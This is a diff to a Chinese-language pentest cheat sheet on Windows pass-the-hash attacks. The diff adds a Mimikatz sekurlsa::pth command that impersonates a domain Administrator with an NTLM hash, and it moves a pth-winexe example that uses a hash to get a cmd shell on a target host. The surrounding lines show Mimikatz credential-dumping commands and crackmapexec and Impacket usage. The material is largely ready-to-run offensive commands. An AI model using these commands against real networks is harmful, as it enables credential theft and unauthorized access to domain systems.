@@ -30,10 +30,18 @@ sekurlsa::logonpasswords full
 lsadump::lsa /patch
 # 获取DC上的所有域用户的NTLM哈希
 sekurlsa::msv
-# 
+# 执行，以允许在目标域中以administrator的身份使用NTLM哈希来进行身份验证
+sekurlsa::pth /user:Administrator /domain:target.com /ntlm:123CDVEE.....NDFE6654GDS
+# 使用例如pth-winexe之类的的工具执行自定义的程序（如cmd.exe可获得一个目标上的shell）
+```
 
+### pth-winexe
 
+* 当找到了目标账户的NTLM哈希之后，可以将其当成密码来使用，绕过输入明文密码来进行身份验证，从而获取到shell：
 
+```bash
+# pth-winexe -U [域名/用户名]%[hash] //[目标IP] cmd.exe
+pth-winexe -U Administrator%00000000000000000000000000000000:123CDVEE.....NDFE6654GDS //192.168.xxx.xxx cmd
 ```
 
 ### Impacket
@@ -58,14 +66,7 @@ crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD --mi
 # 仅以smb模块举例，还有其他模块
 ```
 
-### pth-winexe
 
-* 当找到了目标账户的NTLM哈希之后，可以将其当成密码来使用，绕过输入明文密码来进行身份验证，从而获取到shell：
-
-```bash
-# pth-winexe -U [域名/用户名]%[hash] //[目标IP] cmd.exe
-pth-winexe -U Administrator%00000000000000000000000000000000:32196B56FF.........3BF38 //192.168.xxx.xxx cmd.exe
-```
 
 ### Metasploit
 
